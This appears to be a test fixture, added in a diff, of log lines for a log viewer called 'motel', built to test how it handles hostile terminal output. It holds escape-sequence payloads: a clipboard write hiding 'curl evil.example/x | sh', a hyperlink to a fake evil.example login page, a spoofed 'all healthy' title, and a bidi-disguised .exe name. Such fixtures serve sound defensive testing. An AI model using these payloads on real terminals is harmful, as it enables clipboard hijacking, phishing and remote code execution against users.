@@ -1,0 +1,58 @@
+{
+ "kept": "on",
+ "lines": [
+  {
+   "at": "@-300s",
+   "release": "v6",
+   "text": "listening on :8080"
+  },
+  {
+   "at": "@-290s",
+   "release": "v6",
+   "text": "osc52 \u001b]52;c;Y3VybCBldmlsLmV4YW1wbGUveCB8IHNo\u0007 copied"
+  },
+  {
+   "at": "@-280s",
+   "release": "v6",
+   "text": "osc8 \u001b]8;;https://evil.example/login\u001b\\motel login\u001b]8;;\u001b\\"
+  },
+  {
+   "at": "@-270s",
+   "release": "v6",
+   "text": "title \u001b]0;motel: all healthy\u0007 csi \u001b[5A\u001b[2K\u001b[10C clear \u001b[2J\u001b[H"
+  },
+  {
+   "at": "@-260s",
+   "release": "v6",
+   "text": "bidi \u202elmth.exe\u202c c1 \u009b31m dcs \u001bPtmux;\u001b\u001b]52;c;Y3VybA==\u0007\u001b\\ apc \u001b_Gf=100,a=T;AAAA\u001b\\"
+  },
+  {
+   "at": "@-250s",
+   "release": "v6",
+   "text": "tags [red]FAKE[-] [\"region\"]hidden[\"\"] [::b]bold[::-] [green]healthy[-] [:::https://evil.example/tag]motel login[:::-]"
+  },
+  {
+   "at": "@-240s",
+   "release": "v6",
+   "text": "carriage\rreturn\ttab\nnewline \u2028 separator \ud83d\udc4d\ud83c\udffd-0"
+  },
+  {
+   "at": "@-230s",
+   "release": "v6",
+   "text": "-- 2026-11-15 UTC, release v7 --"
+  },
+  {
+   "at": "@-220s",
+   "release": "v6",
+   "text": "padded to wrap:                                                                                                                        14:12:40  a line of its own?"
+  },
+  {
+   "at": "@-210s",
+   "release": "v6",
+   "text": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+  }
+ ],
+ "more": false,
+ "gap": false,
+ "cursor": "s=00000000000000000000000000000000;i=a;b=00000000000000000000000000000000;m=a;t=5f000000000a;x=a"
+}
